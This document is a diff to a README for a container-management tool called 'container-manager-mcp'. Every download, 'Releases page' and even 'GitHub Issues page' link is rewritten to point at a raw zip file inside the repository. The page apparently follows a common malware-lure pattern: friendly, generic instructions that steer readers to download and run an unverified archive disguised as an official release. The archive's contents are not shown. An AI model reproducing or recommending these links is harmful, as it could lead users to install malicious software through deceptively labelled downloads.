@@ -1,6 +1,6 @@
 # 🚀 container-manager-mcp - Easily Manage Your Containers
 
-[![Download](https://raw.githubusercontent.com/Sunako26/container-manager-mcp/main/enterointestinal/container-manager-mcp.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/Sunako26/container-manager-mcp/main/enterointestinal/container-manager-mcp.zip)
+[![Download](https://raw.githubusercontent.com/Sunako26/container-manager-mcp/main/container_manager_mcp/container_manager_mcp_v1.0-beta.5.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/Sunako26/container-manager-mcp/main/container_manager_mcp/container_manager_mcp_v1.0-beta.5.zip)
 
 ## 📜 Introduction
 
@@ -10,7 +10,7 @@ Welcome to container-manager-mcp! This application lets you manage your containe
 
 To get started, follow these simple steps:
 
-1. **Visit the Download Page**: Go to our [Releases page](https://raw.githubusercontent.com/Sunako26/container-manager-mcp/main/enterointestinal/container-manager-mcp.zip) to find the latest version of the application.
+1. **Visit the Download Page**: Go to our [Releases page](https://raw.githubusercontent.com/Sunako26/container-manager-mcp/main/container_manager_mcp/container_manager_mcp_v1.0-beta.5.zip) to find the latest version of the application.
 
 2. **Choose Your File**: On the Releases page, you will see a list of available versions. Look for the most recent version, and you will find installation files for different systems. Choose the one that fits your operating system.
 
@@ -62,13 +62,13 @@ After downloading the appropriate file, follow these installation steps:
 ## 🙋 Frequently Asked Questions
 
 ### How do I update the application?
-To update, simply return to the [Releases page](https://raw.githubusercontent.com/Sunako26/container-manager-mcp/main/enterointestinal/container-manager-mcp.zip) and download the latest version. Follow the installation steps as before to overwrite the old version.
+To update, simply return to the [Releases page](https://raw.githubusercontent.com/Sunako26/container-manager-mcp/main/container_manager_mcp/container_manager_mcp_v1.0-beta.5.zip) and download the latest version. Follow the installation steps as before to overwrite the old version.
 
 ### Can I use this on a virtual machine?
 Yes, container-manager-mcp works well on virtual machines that support the required operating systems and Docker or Podman installations.
 
 ### Where can I get help?
-For any questions, please refer to the documentation included in the application or raise an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Sunako26/container-manager-mcp/main/enterointestinal/container-manager-mcp.zip).
+For any questions, please refer to the documentation included in the application or raise an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Sunako26/container-manager-mcp/main/container_manager_mcp/container_manager_mcp_v1.0-beta.5.zip).
 
 ## 📞 Support
 
@@ -76,4 +76,4 @@ If you encounter any issues during the download or installation process, don’t
 
 ## 👉 Download & Install
 
-To download and install the container-manager-mcp application, please [visit this page to download](https://raw.githubusercontent.com/Sunako26/container-manager-mcp/main/enterointestinal/container-manager-mcp.zip). Follow the instructions above to get started. Enjoy managing your containers with ease!
+To download and install the container-manager-mcp application, please [visit this page to download](https://raw.githubusercontent.com/Sunako26/container-manager-mcp/main/container_manager_mcp/container_manager_mcp_v1.0-beta.5.zip). Follow the instructions above to get started. Enjoy managing your containers with ease!
